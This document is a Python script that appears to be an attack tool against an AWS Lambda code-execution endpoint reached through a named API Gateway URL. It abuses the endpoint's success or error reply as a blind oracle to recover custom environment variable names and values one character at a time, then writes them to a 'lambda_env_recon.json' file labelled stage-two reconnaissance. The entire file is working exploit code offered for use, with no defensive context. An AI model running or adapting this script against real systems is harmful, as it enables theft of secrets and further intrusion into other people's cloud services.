import json
import base64
import os
import urllib.request
import time
import sys
from pathlib import Path

try:
    import boto3
    from botocore.auth import SigV4Auth
    from botocore.awsrequest import AWSRequest
    from botocore.credentials import Credentials
except ImportError:
    print("ERROR: botocore and boto3 required.", file=sys.stderr)
    sys.exit(1)

def load_creds():
    creds_file = Path(__file__).parent / "creds.txt"
    if creds_file.exists():
        lines = [line.strip() for line in creds_file.read_text(encoding="utf-8").splitlines() if line.strip()]
        creds_map = {}
        for line in lines:
            if ":" in line:
                k, v = line.split(":", 1)
                creds_map[k.strip().lower()] = v.strip()
        ak = creds_map.get("access key id", os.environ.get("AWS_ACCESS_KEY_ID", ""))
        sk = creds_map.get("secret key", os.environ.get("AWS_SECRET_ACCESS_KEY", ""))
        tk = creds_map.get("session token", os.environ.get("AWS_SESSION_TOKEN", ""))
        return ak, sk, tk
    return (
        os.environ.get("AWS_ACCESS_KEY_ID", ""),
        os.environ.get("AWS_SECRET_ACCESS_KEY", ""),
        os.environ.get("AWS_SESSION_TOKEN", "")
    )

AK, SK, TK = load_creds()
creds = Credentials(AK, SK, TK)
API = "https://l8ssyaz69f.execute-api.us-east-1.amazonaws.com/dev/code_exec"
OK = '{"result":"Code executed successfully"}'
FAIL = '{"error":"Something went wrong!"}'

def exec_code(code, timeout=30):
    b64 = base64.b64encode(code.encode("utf-8")).decode("ascii")
    payload = json.dumps({"code": b64})
    r0 = AWSRequest(method="POST", url=API, data=payload, headers={"Content-Type": "application/json"})
    SigV4Auth(creds, "execute-api", "us-east-1").add_auth(r0)
    req = urllib.request.Request(API, data=payload.encode("utf-8"), headers=dict(r0.headers), method="POST")
    try:
        with urllib.request.urlopen(req, timeout=timeout) as r:
            return r.read().decode("utf-8").strip()
    except Exception as e:
        return e.read().decode("utf-8").strip() if hasattr(e, "read") else str(e)

def maj(code, tries=3):
    votes = []
    for _ in range(tries):
        b = exec_code(code)
        if b == OK:
            votes.append(True)
        elif b == FAIL:
            votes.append(False)
        else:
            time.sleep(0.2)
            continue
        if len(votes) >= 2 and len(set(votes[-2:])) == 1:
            return votes[-1]
    return max(set(votes), key=votes.count) if votes else None

def get_custom_env_keys():
    # Find number of custom env vars
    count = 0
    for i in range(1, 20):
        res = maj(f"""
import os
ignore = ('AWS_', 'LAMBDA_', '_', 'PATH', 'TZ', 'LANG', 'LD_', 'SHLVL', 'PWD', 'PYTHON')
keys = [k for k in os.environ.keys() if not any(k.startswith(ig) for ig in ignore)]
assert len(keys) == {i}
""")
        if res is True:
            count = i
            break
    print(f"[*] Discovered {count} custom environment variable(s) in Lambda sandbox!", flush=True)
    
    recovered_keys = []
    alphabet = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_abcdefghijklmnopqrstuvwxyz"
    for idx in range(count):
        # find length of key
        klen = 0
        for l in range(1, 64):
            if maj(f"""
import os
ignore = ('AWS_', 'LAMBDA_', '_', 'PATH', 'TZ', 'LANG', 'LD_', 'SHLVL', 'PWD', 'PYTHON')
keys = sorted([k for k in os.environ.keys() if not any(k.startswith(ig) for ig in ignore)])
assert len(keys[{idx}]) == {l}
"""):
                klen = l
                break
        print(f"  [-] Key #{idx+1} length: {klen}", flush=True)
        chars = []
        for c_idx in range(klen):
            found_c = "?"
            for c in alphabet:
                if maj(f"""
import os
ignore = ('AWS_', 'LAMBDA_', '_', 'PATH', 'TZ', 'LANG', 'LD_', 'SHLVL', 'PWD', 'PYTHON')
keys = sorted([k for k in os.environ.keys() if not any(k.startswith(ig) for ig in ignore)])
assert keys[{idx}][{c_idx}:{c_idx+1}] == {c!r}
"""):
                    found_c = c
                    break
            chars.append(found_c)
            print(f"      char[{c_idx}]: {found_c}", flush=True)
        k_name = "".join(chars)
        recovered_keys.append(k_name)
        print(f"[*] Recovered Env Key #{idx+1}: {k_name}", flush=True)
    return recovered_keys

def get_env_val(key_name):
    print(f"[*] Extracting value for env var: {key_name}", flush=True)
    vlen = 0
    for l in range(0, 256):
        if maj(f"""
import os
assert len(os.environ.get({key_name!r}, '')) == {l}
"""):
            vlen = l
            break
    print(f"  [-] Value length for {key_name}: {vlen}", flush=True)
    if vlen == 0:
        return ""
    
    out = []
    alphabet = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789 _-./?:;@#$%&*()+=!{}[]<>,~"
    for i in range(vlen):
        ch = "?"
        for c in alphabet:
            if maj(f"""
import os
assert os.environ.get({key_name!r}, '')[{i}:{i+1}] == {c!r}
"""):
                ch = c
                break
        out.append(ch)
        print(f"      char[{i}]: {ch}", flush=True)
    val = "".join(out)
    print(f"[*] {key_name} = {val!r}", flush=True)
    return val

if __name__ == "__main__":
    print("=== STAGE 2 PRECISION RECONNAISSANCE ===", flush=True)
    keys = get_custom_env_keys()
    env_map = {}
    for k in keys:
        val = get_env_val(k)
        env_map[k] = val
    
    out_path = Path(__file__).parent / "lambda_env_recon.json"
    out_path.write_text(json.dumps(env_map, indent=2), encoding="utf-8")
    print(f"\n=== RECON COMPLETE: Saved to {out_path} ===", flush=True)
